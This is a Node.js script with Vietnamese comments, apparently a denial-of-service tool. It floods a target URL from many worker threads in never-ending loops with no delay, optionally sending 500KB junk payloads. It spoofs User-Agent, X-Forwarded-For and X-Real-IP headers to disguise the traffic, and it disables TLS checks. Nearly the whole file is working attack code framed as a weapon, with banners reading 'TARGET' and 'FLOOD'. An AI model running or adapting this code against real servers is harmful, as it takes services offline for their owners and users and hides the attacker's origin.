// ========== HEADER HỢP LỆ (KHÔNG LỖI TOKEN) ==========
function cleanHeaderValue(value) {
  return String(value).replace(/[^\x20-\x7E]/g, '').substring(0, 200);
}

function createHeaders(requestId) {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
  ];
  
  const ips = ['8.8.8.8', '1.1.1.1', '4.4.4.4', '5.5.5.5', '9.9.9.9'];
  const fakeIP = ips[Math.floor(Math.random() * ips.length)];
  
  return {
    'User-Agent': userAgents[requestId % userAgents.length],
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Connection': 'close',
    'X-Forwarded-For': fakeIP,
    'X-Real-IP': fakeIP,
    'X-Request-ID': crypto.randomBytes(8).toString('hex')
  };
}

// ========== TẠO PAYLOAD 500KB ==========
function createPayload(requestId) {
  return JSON.stringify({
    id: requestId,
    ts: Date.now(),
    data: Buffer.alloc(500000, 'X').toString()
  });
}

// ========== GỬI REQUEST KHÔNG CHỜ ==========
function sendRequestFast(url, headers, payload) {
  return new Promise((resolve) => {
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: payload ? 'POST' : 'GET',
      headers: headers,
      timeout: 3000,
      rejectUnauthorized: false
    };
    
    const client = parsedUrl.protocol === 'https:' ? https : http;
    const req = client.request(options, (res) => {
      resolve({ status: res.statusCode });
    });
    
    req.on('error', () => resolve({ status: 0 }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0 }); });
    
    if (payload) req.write(payload);
    req.end();
  });
}

// ========== WORKER THREAD - FLOOD KHÔNG NGỪNG ==========
if (!isMainThread) {
  const { targetUrl, threadId, sendPayload, delay } = workerData;
  let count = 0;
  let success = 0;
  
  const interval = setInterval(async () => {
    count++;
    const headers = createHeaders(count);
    let payload = null;
    
    if (sendPayload) {
      payload = createPayload(count);
    }
    
    const result = await sendRequestFast(targetUrl, headers, payload);
    if (result.status > 0 && result.status < 500) success++;
    
    if (count % 100 === 0) {
      parentPort.postMessage({ threadId, count, success });
    }
  }, delay);
  
  // Không bao giờ dừng
}

// ========== FLOOD TỨC THÌ ==========
async function instantFlood(config) {
  clearScreen();
  showBanner();
  
  const targetUrl = `${config.url}${config.endpoint || '/'}`;
  const numThreads = config.threads || 20;
  const sendPayload = config.sendPayload || false;
  const delay = config.delay || 0; // 0ms = flood tức thì
  
  log('\n💀 KÍCH HOẠT FLOOD TỨC THÌ 💀\n', 'red');
  log(`  🎯 TARGET: ${targetUrl}`, 'yellow');
  log(`  🧵 THREADS: ${numThreads} (song song)`, 'cyan');
  log(`  ⚡ DELAY: ${delay}ms (0 = tối đa)`, 'magenta');
  log(`  📦 PAYLOAD: ${sendPayload ? '500KB/req' : 'KHÔNG'}`, 'green');
  log(`  🚀 TỐC ĐỘ DỰ KIẾN: ${(1000/(delay+1) * numThreads).toFixed(0)} req/s`, 'red');
  log(`\n  ⚠️  NHẤN Ctrl+C ĐỂ DỪNG FLOOD\n`, 'yellow');
  log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'cyan');
  
  let totalRequests = 0;
  let totalSuccess = 0;
  let isRunning = true;
  const startTime = Date.now();
  
  // Khởi tạo workers
  const workers = [];
  for (let i = 0; i < numThreads; i++) {
    const worker = new Worker(__filename, {
      workerData: { targetUrl, threadId: i, sendPayload, delay }
    });
    
    worker.on('message', (data) => {
      totalRequests += data.count;
      totalSuccess += data.success;
    });
    
    workers.push(worker);
  }
  
  // Hiển thị stats mỗi giây
  const statsInterval = setInterval(() => {
    if (!isRunning) return;
    const elapsed = (Date.now() - startTime) / 1000;
    const rps = (totalRequests / elapsed).toFixed(0);
    const successRate = totalRequests > 0 ? ((totalSuccess / totalRequests) * 100).toFixed(1) : 0;
    
    process.stdout.write(`\r${c.green}✓${totalSuccess}${c.reset} | ${c.red}✗${totalRequests - totalSuccess}${c.reset} | 📊${totalRequests} req | 🚀${rps} req/s | ✅${successRate}%    `);
  }, 1000);
  
  // Bắt Ctrl+C
  const cleanup = () => {
    if (!isRunning) return;
    isRunning = false;
    clearInterval(statsInterval);
    workers.forEach(w => w.terminate());
    const elapsed = (Date.now() - startTime) / 1000;
    log(`\n\n📊 KẾT QUẢ FLOOD TỨC THÌ:`, 'yellow');
    log(`  ✅ THÀNH CÔNG: ${totalSuccess}`, 'green');
    log(`  ❌ THẤT BẠI: ${totalRequests - totalSuccess}`, 'red');
    log(`  📈 TỔNG REQUEST: ${totalRequests}`, 'cyan');
    log(`  🚀 TỐC ĐỘ TB: ${(totalRequests/elapsed).toFixed(0)} req/s`, 'magenta');
    log(`  ⏱️ THỜI GIAN: ${elapsed.toFixed(1)}s`, 'yellow');
    process.exit(0);
  };
  
  process.on('SIGINT', cleanup);
}

